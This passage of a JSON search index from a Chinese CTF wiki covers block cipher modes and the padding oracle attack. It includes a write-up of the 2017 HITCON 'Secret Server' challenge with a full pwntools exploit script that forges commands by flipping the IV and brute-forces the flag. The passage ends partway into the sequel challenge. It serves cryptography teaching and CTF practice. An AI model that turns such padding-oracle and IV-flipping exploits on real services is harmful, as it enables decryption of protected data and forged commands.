            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_7", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_8", 
            "text": "\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002  \u52a0\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_9", 
            "text": "\u5b57\u8282\u53cd\u8f6c\u653b\u51fb  IV \u5411\u91cf\uff0c\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4  \u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\uff0c\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4    Padding Oracle Attack\uff0c\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u4ecb\u7ecd\u3002", 
            "title": "\u653b\u51fb"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#pcbc", 
            "text": "PCBC\u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002", 
            "title": "PCBC"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_10", 
            "text": "", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_11", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_12", 
            "text": "\u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316  \u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#cfb", 
            "text": "CFB\u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002", 
            "title": "CFB"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_13", 
            "text": "", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_14", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_15", 
            "text": "\u52a0\u89e3\u5bc6\u5747\u4e0d\u80fd\u5e76\u884c\u5316\u3002", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_16", 
            "text": "HITCONCTF-Quals-2015-Simple-(Crypto-100)", 
            "title": "\u653b\u51fb"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#ofb", 
            "text": "OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\u3002", 
            "title": "OFB"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_17", 
            "text": "", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_18", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#ctr", 
            "text": "CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\u3002", 
            "title": "CTR"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_19", 
            "text": "", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_20", 
            "text": "", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#padding-oracle-attack", 
            "text": "", 
            "title": "Padding Oracle Attack"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_21", 
            "text": "Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6   \u52a0\u5bc6\u7b97\u6cd5  \u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002  \u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002    \u653b\u51fb\u8005\u80fd\u529b  \u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002  \u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002     Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b   \u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_22", 
            "text": "Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b   \u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002  \u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002   \u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684   \u52a0\u5bc6    \nC_i=E_K(P_i \\oplus C_{i-1})\\\\\nC_0=IV  \nC_i=E_K(P_i \\oplus C_{i-1})\\\\\nC_0=IV    \u89e3\u5bc6    \nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV  \nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV   \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002  \u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587  F|Y  \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a\n$$\nP=D_K(Y)\\oplus F\n$$  \u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282  F_{n} F_{n}  \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b   i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a \u968f\u673a\u5b57\u8282 \u3002  \u8bbe\u7f6e  F_n=i \\oplus 0x01 F_n=i \\oplus 0x01  \u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e  P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01  \u5b57\u8282\u90fd\u662f  P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01  \u624d\u4e0d\u4f1a\u62a5\u9519\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002  \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519 \u6982\u7387\u5f88\u5c0f \u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002  \u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002   \u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e  F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02  \uff0c\u540c\u65f6\u8bbe\u7f6e  F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02  \u53bb\u679a\u4e3e i\u3002  \u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002  \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#2017-hitcon-secret-server", 
            "text": "", 
            "title": "2017 HITCON Secret Server"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_23", 
            "text": "\u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c  def   pad ( msg ): \n     pad_length   =   16 - len ( msg ) % 16 \n     return   msg + chr ( pad_length ) * pad_length  def   unpad ( msg ): \n     return   msg [: - ord ( msg [ - 1 ])]   \u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002  \u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f   send_msg  \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684  2jpmLoSsOlQrqyqE  \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002  recv_msg  \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c                msg   =   recv_msg () . strip () \n             if   msg . startswith ( exit-here ): \n                 exit ( 0 ) \n             elif   msg . startswith ( get-flag ): \n                 send_msg ( flag ) \n             elif   msg . startswith ( get-md5 ): \n                 send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) \n             elif   msg . startswith ( get-time ): \n                 send_msg ( str ( time . time ())) \n             elif   msg . startswith ( get-sha1 ): \n                 send_msg ( SHA . new ( msg [ 8 :]) . digest ()) \n             elif   msg . startswith ( get-sha256 ): \n                 send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) \n             elif   msg . startswith ( get-hmac ): \n                 send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) \n             else : \n                 send_msg ( command not found )", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_24", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206   \u52a0\u5bc6  \u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002  'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002    \u89e3\u5bc6  \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002     \u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053  Welcome!!  \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b   \nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV  \nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV   \u5982\u679c\u6211\u4eec\u5c06  Welcome!!  \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u5176\u5f97\u5230\u7684\u7ed3\u679c\u4fbf\u662f  \uff08Welcome!!+'\\x07'*7) xor iv_encrypt \uff0c\u5982\u679c\u6211\u4eec \u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c \u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4 \u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053  flag  \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002  \u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c \u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255 \u3002", 
            "title": "\u4e3b\u8981\u6f0f\u6d1e"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_25", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u7ed5\u8fc7 proof of work  \u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002  \u7531\u4e8e flag \u7684\u5f00\u5934\u662f  hitcon{ \uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c  get-md5  \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a  hitcon{x \uff0c\u5373\u53ea\u4fdd\u7559 hitcon{  \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002  \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94  md5 \uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002   \u5177\u4f53\u4ee3\u7801\u5982\u4e0b  #coding=utf-8  from   pwn   import   *  import   base64 ,   time ,   random ,   string  from   Crypto.Cipher   import   AES  from   Crypto.Hash   import   SHA256 ,   MD5  #context.log_level =  debug  if   args [ REMOTE ]: \n     p   =   remote ( 52.193.157.19 ,   9999 )  else : \n     p   =   remote ( 127.0.0.1 ,   7777 )  def   strxor ( str1 ,   str2 ): \n     return   . join ([ chr ( ord ( c1 )   ^   ord ( c2 ))   for   c1 ,   c2   in   zip ( str1 ,   str2 )])  def   pad ( msg ): \n     pad_length   =   16   -   len ( msg )   %   16 \n     return   msg   +   chr ( pad_length )   *   pad_length  def   unpad ( msg ): \n     return   msg [: - ord ( msg [ - 1 ])]    # \u53bb\u6389pad  def   flipplain ( oldplain ,   newplain ,   iv ): \n     flip oldplain to new plain, return proper iv \n     return   strxor ( strxor ( oldplain ,   newplain ),   iv )  def   bypassproof (): \n     p . recvuntil ( SHA256(XXXX+ ) \n     lastdata   =   p . recvuntil ( ) ,   drop = True ) \n     p . recvuntil (  ==  ) \n     digest   =   p . recvuntil ( \\n Give me XXXX: ,   drop = True ) \n\n     def   proof ( s ): \n         return   SHA256 . new ( s   +   lastdata ) . hexdigest ()   ==   digest \n\n     data   =   pwnlib . util . iters . mbruteforce ( \n         proof ,   string . ascii_letters   +   string . digits ,   4 ,   method = fixed ) \n     p . sendline ( data ) \n     p . recvuntil ( Done! \\n )  iv_encrypt   =   2jpmLoSsOlQrqyqE  def   getmd5enc ( i ,   cipher_flag ,   cipher_welcome ): \n     return encrypt( md5( flag[7:7+i] ) ) \n     ## keep iv[7:] do not change, so decrypt won t change \n     new_iv   =   flipplain ( hitcon{ . ljust ( 16 ,   \\x00 ),   get-md5 . ljust ( \n         16 ,   \\x00 ),   iv_encrypt ) \n     payload   =   new_iv   +   cipher_flag \n     ## calculate the proper last byte number \n     last_byte_iv   =   flipplain ( \n         pad ( Welcome!! ), \n         a   *   15   +   chr ( len ( cipher_flag )   +   16   +   16   -   ( 7   +   i   +   1 )),   iv_encrypt ) \n     payload   +=   last_byte_iv   +   cipher_welcome \n     p . sendline ( base64 . b64encode ( payload )) \n     return   p . recvuntil ( \\n ,   drop = True )  def   main (): \n     bypassproof () \n\n     # result of encrypted Welcome!! \n     cipher   =   p . recvuntil ( \\n ,   drop = True ) \n     cipher_welcome   =   base64 . b64decode ( cipher )[ 16 :] \n     log . info ( cipher welcome is :    +   cipher_welcome ) \n\n     # execute get-flag \n     get_flag_iv   =   flipplain ( pad ( Welcome!! ),   pad ( get-flag ),   iv_encrypt ) \n     payload   =   base64 . b64encode ( get_flag_iv   +   cipher_welcome ) \n     p . sendline ( payload ) \n     cipher   =   p . recvuntil ( \\n ,   drop = True ) \n     cipher_flag   =   base64 . b64decode ( cipher )[ 16 :] \n     flaglen   =   len ( cipher_flag ) \n     log . info ( cipher flag is :    +   cipher_flag ) \n\n     # get command not found cipher \n     p . sendline ( base64 . b64encode ( iv_encrypt   +   cipher_welcome )) \n     cipher_notfound   =   p . recvuntil ( \\n ,   drop = True ) \n\n     flag   =   \n     # brute force for every byte of flag \n     for   i   in   range ( flaglen   -   7 ): \n         md5_indexi   =   getmd5enc ( i ,   cipher_flag ,   cipher_welcome ) \n         md5_indexi   =   base64 . b64decode ( md5_indexi )[ 16 :] \n         log . info ( get encrypt(md5(flag[7:7+i])):    +   md5_indexi ) \n         for   guess   in   range ( 256 ): \n             # locally compute md5 hash \n             guess_md5   =   MD5 . new ( flag   +   chr ( guess )) . digest () \n             # try to null out the md5 plaintext and execute a command \n             payload   =   flipplain ( guess_md5 ,   get-time . ljust ( 16 ,   \\x01 ), \n                                 iv_encrypt ) \n             payload   +=   md5_indexi \n             p . sendline ( base64 . b64encode ( payload )) \n             res   =   p . recvuntil ( \\n ,   drop = True ) \n             # if we receive the block for  command not found , the hash was wrong \n             if   res   ==   cipher_notfound : \n                 print   Guess {} is wrong. . format ( guess ) \n             # otherwise we correctly guessed the hash and the command was executed \n             else : \n                 print   Found! \n                 flag   +=   chr ( guess ) \n                 print   Flag so far: ,   flag \n                 break  if   __name__   ==   __main__ : \n     main ()   \u6700\u540e\u7ed3\u679c\u5982\u4e0b  Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#2017-hitcon-secret-server-revenge", 
            "text": "", 
            "title": "2017 HITCON Secret Server Revenge"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_26", 
            "text": "The password of zip is the flag of  Secret Server", 
            "title": "\u63cf\u8ff0"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_27", 
            "text": "\u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539   \u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002  \u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002  \u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c   \u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b   \u7ecf\u8fc7 proof of work  \u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f  \u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002", 
            "title": "\u5206\u6790"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_28", 
            "text": "\u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373   \u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4  \u957f\u5ea6\u622a\u65ad", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/crypto/symmetric/block-cipher/#_29", 
            "text": "\u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97  md5(token[:i])  \u52a0\u5bc6\u540e\u7684\u503c\uff08 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002 \u8fd9\u91cc md5(token[:i])   \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002  \u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f    \u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6  md5(token[:i])  